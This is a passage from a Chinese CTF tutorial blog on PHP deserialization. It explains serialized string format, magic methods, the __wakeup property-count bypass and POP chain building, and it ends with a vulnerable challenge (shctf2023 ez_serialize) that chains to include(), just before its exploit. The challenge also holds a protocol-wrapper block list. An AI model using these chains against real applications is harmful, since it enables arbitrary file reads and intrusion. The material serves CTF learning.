class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sunset</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;asdadasd&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;makabaka&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;18&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title function_ invoke__">sunset</span>(); <span class="comment">//实例化一个对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:6:&quot;sunset&quot;:3:&#123;s:4:&quot;flag&quot;;s:14:&quot;flag&#123;asdadasd&#125;&quot;;s:4:&quot;name&quot;;s:8:&quot;makabaka&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span></span><br></pre></td></tr></table></figure><ul><li>O代表对象，这里是序列化的一个对象，要序列化数组的就用A</li><li>6表示的是类的长度</li><li>sunset表示对是类名</li><li>3表示类里面有3个属性也称为变量</li><li>s表示字符串的长度<code>这里的flag表示属性</code></li><li>比如<code>s:4:&quot;flag&quot;</code> 这里表示的是 flag属性名（变量名）为4个字符串长度 字符串 属性长度 属性值</li></ul><p>而反序列化就是将序列化后的字符串重新反序列化为一个对象。</p><h2 id="关于PHP中public、protected、private"><a href="#关于PHP中public、protected、private" class="headerlink" title="关于PHP中public、protected、private"></a>关于PHP中public、protected、private</h2><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><p>public修饰的属性和方法可以在任何地方被访问，包括类的内部、子类和外部代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person</span>-&gt;name; <span class="comment">// 可以直接访问 public 属性</span></span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">sayHello</span>(); <span class="comment">// 可以直接调用 public 方法</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><p>protected修饰的属性和方法只能在当前类及其子类中被访问，外部的代码访问不了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name; <span class="comment">// 子类可以访问 protected 属性</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sayHello</span>(); <span class="comment">// 子类可以调用 protected 方法</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$student</span> = <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">  <span class="variable">$student</span>-&gt;<span class="title function_ invoke__">showName</span>(); <span class="comment">// 可以访问父类的 protected 属性和方法</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$student</span>-&gt;name; <span class="comment">// 外部代码不能访问 protected 属性  会显示错误</span></span><br><span class="line">  <span class="variable">$student</span>-&gt;<span class="title function_ invoke__">sayHello</span>(); <span class="comment">// 外部代码不能调用 protected 方法 会显示错误</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><p>private修饰的属性和方法只能在当前类中被访问，子类和外部代码不能访问。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name; <span class="comment">// 子类不能访问父类的 private 属性</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sayHello</span>(); <span class="comment">// 子类不能调用父类的 private 方法</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$person</span>-&gt;name; <span class="comment">// 外部代码不能访问 private 属性 会发生报错</span></span><br><span class="line">  <span class="variable">$person</span>-&gt;<span class="title function_ invoke__">sayHello</span>(); <span class="comment">// 外部代码不能调用 private 方法 会发生报错</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="关于绕过protected、private"><a href="#关于绕过protected、private" class="headerlink" title="关于绕过protected、private"></a>关于绕过protected、private</h3><p>最有效的方法是将序列化字符串进行url编码，也可以在序列化属性前加上%00.</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()//创建对象时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h3 id="sleep（）"><a href="#sleep（）" class="headerlink" title="__sleep（）"></a>__sleep（）</h3><p><code>__sleep()</code> 方法是 PHP 中的一个魔术方法（magic method），用于在对象被序列化（serialized）时触发。在这个方法中，你可以指定哪些属性需要被序列化，哪些属性不需要被序列化。</p><p>具体来说，当调用 <code>serialize()</code> 函数将一个对象序列化时，PHP 会先自动调用对象的 <code>__sleep()</code> 方法，该方法需要返回一个数组，包含需要被序列化的属性名。然后 PHP 会将这些属性序列化成字符串。</p><p>假设有一个 <code>User</code> 类，它有一个私有属性 <code>$password</code>，你不希望在序列化对象时将密码属性暴露出来。那么你可以在 <code>User</code> 类中实现 <code>__sleep()</code> 方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;john&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>;</span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:1:&#123;s:14:&quot;Userusername&quot;;s:4:&quot;john&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源 而<code>wakeup()</code> 用于在从字符串反序列化为对象时自动调用。一个 PHP 对象被序列化成字符串并存储在文件、数据库或者通过网络传输时，我们可以使用 <code>unserialize()</code> 函数将其反序列化为一个 PHP 对象。在这个过程中，PHP 会自动调用该对象的 <code>__wakeup()</code> 方法，对其进行初始化。</p><p><code>__wakeup()</code> 方法的作用是对一个对象进行一些必要的初始化操作。例如，如果一个对象中包含了一些需要进行身份验证的属性，那么在从字符串反序列化为对象时，就可以在 <code>__wakeup()</code> 方法中进行身份验证。或者如果一个对象中包含了一些需要在每次初始化时计算的属性，也可以在 <code>__wakeup()</code> 方法中进行计算.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">authenticate</span>()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Authentication failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 进行身份验证</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;john&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$unserialized</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上面的示例中<code>User</code> 类实现了 <code>__sleep()</code> 和 <code>__wakeup()</code> 方法。<code>__sleep()</code> 方法返回了一个包含 <code>username</code> 和 <code>password</code> 属性名的数组，表示只有这两个属性需要被序列化。<code>__wakeup()</code> 方法会调用 <code>authenticate()</code> 方法进行身份验证。如果身份验证失败，则会抛出一个异常。</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><strong>漏洞影响版本：</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p><strong>漏洞产生原因：</strong></p><p>如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行。</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; info=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;name:%s,age:%s&quot;</span>,<span class="variable">$this</span>-&gt;name,<span class="variable">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;__toString:&#x27;</span>.<span class="variable">$person</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>; </span><br><span class="line"><span class="comment">//__toString:name:John,age:30</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p><code>__destruct</code> 方法是 PHP 中的一个特殊方法，用于在对象实例被销毁时自动调用。该方法通常用于清理对象所占用的资源，例如关闭数据库连接、释放文件句柄等。</p><h4 id="魔术方法运行的先后顺序"><a href="#魔术方法运行的先后顺序" class="headerlink" title="魔术方法运行的先后顺序"></a>魔术方法运行的先后顺序</h4><h5 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct()和__destruct()"></a><code>__construct()和__destruct()</code></h5><ul><li><code>construct</code>:当对象创建时会被调用，是在new对象时才调用，<code>unserialize</code> 时不对被自动调用</li><li><code>destruct()</code> : 当对象被销毁时自动调用，有新的对象创建 之后会自动销毁 相当于调用了<code>__construct</code> 后一定会调用<code>__destruct</code> 现在传入一个对象，他后面被销毁时会调用 <code>destruct</code></li></ul><h5 id="seelp-和-wakeup"><a href="#seelp-和-wakeup" class="headerlink" title="__seelp() 和__wakeup()"></a><code>__seelp()</code> 和<code>__wakeup()</code></h5><ul><li><code>__seelp()</code> 在对象被序列化之前调用</li><li><code>__wakeup()</code> 在对象被反序列化之前调用</li></ul><h5 id="toString"><a href="#toString" class="headerlink" title="__toString()"></a><code>__toString()</code></h5><p>__toString作为pop链关键的一步，很容易被调用。当对象被当作字符串的时候，<code>__toString()</code> 会被调用，不管对象有没有被打印出来，在对象被操作的时候，对象在和其他的字符串做比较的时候也会被调用。</p><ul><li>echo($obj)或print($obj)打印<strong>对象</strong>时会触发</li><li>反序列化<strong>对象</strong>与字符串连接时</li><li>反序列化<strong>对象</strong>参与格式化字符串时</li><li>反序列化<strong>对象</strong>与<strong>字符串</strong>进行**&#x3D;&#x3D;<strong>比较时(多为</strong>preg_match正则匹配**)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li><li>反序列化<strong>对象</strong>参与格式化sql语句时，绑定参数时(用的少)</li><li>反序列化<strong>对象</strong>经过php字符串函数时，如strlen(),addslashes()时(用的少)</li><li>在in_array()方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有tostring返回的字符串的时候tostring会被调用</li><li>反序列化的<strong>对象</strong>作为class_exists()的参数的时候(用的少)</li></ul><h5 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h5><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用<strong>这个魔术方法只在PHP 5.3.0 及以上版本有效)</strong></p><h5 id="get-和-set"><a href="#get-和-set" class="headerlink" title="__get()和__set()"></a><code>__get()和__set()</code></h5><ul><li><code>__get()</code>：从<strong>不可访问的属性中</strong>读取数据，或者说是调用一个类及其父类方法中未定义属性时</li><li><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private protected</code>)(用的不多)</li></ul><h5 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call()和__callStatic()"></a><code>__call()</code>和<code>__callStatic()</code></h5><ul><li><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</li><li><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用</li></ul><h5 id="其他魔术方法"><a href="#其他魔术方法" class="headerlink" title="其他魔术方法"></a>其他魔术方法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__isset()：当对不可访问属性调用isset()或empty()时调用</span><br><span class="line">__unset()：当对不可访问属性调用unset()时被调用。</span><br><span class="line">__set_state()：调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone()：当对象复制完成时调用</span><br><span class="line">__autoload()：尝试加载未定义的类</span><br><span class="line">__debugInfo()：打印所需调试信息</span><br></pre></td></tr></table></figure><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><p>利用现有的环境，找到一系列的代码或者调用指令，然后构造成一组连续的调用链，然后进行攻击。任何一条链子的构造，我们都要先找到它的头和尾，pop链也不例外，pop链的头部一般是用户能传入参数的地方，而尾部是可以执行我们操作的地方，比如说读写文件，执行命令等等；找到头尾之后，从尾部(我们执行操作的地方)开始，看它在哪个方法中，怎么样可以调用它，一层一层往上倒推，直到推到头部为止，也就是我们传参的地方，一条pop链子就出来了；在ctf中，头部一般都会是GET或者POST传参，然后可能就有一个<code>unserialize</code>直接将我们传入的参数反序列化了，尾部都是拿flag的地方；然后一环连着一环构成pop链.</p><h3 id="普通pop"><a href="#普通pop" class="headerlink" title="普通pop"></a>普通pop</h3><h5 id="shctf2023-ez-serialize"><a href="#shctf2023-ez-serialize" class="headerlink" title="shctf2023 ez_serialize"></a>shctf2023 ez_serialize</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var_1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;var_1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)//反序列化之前调用</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;q)) &#123;<span class="comment">//字符串比较，可以触发__toString</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;           </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;z-&gt;<span class="keyword">var</span>;<span class="comment">//调用不可访问的属性，触发__get</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();<span class="comment">//将对象作为函数使用，可以触发__invoke</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>很显然，这条链子头部是<code>B::__wakeup</code>,尾部是<code>A::__invoke</code>,通过__invoke函数，可以利用php伪协议进行任意文件读取，exp:</p><figure class="highlight 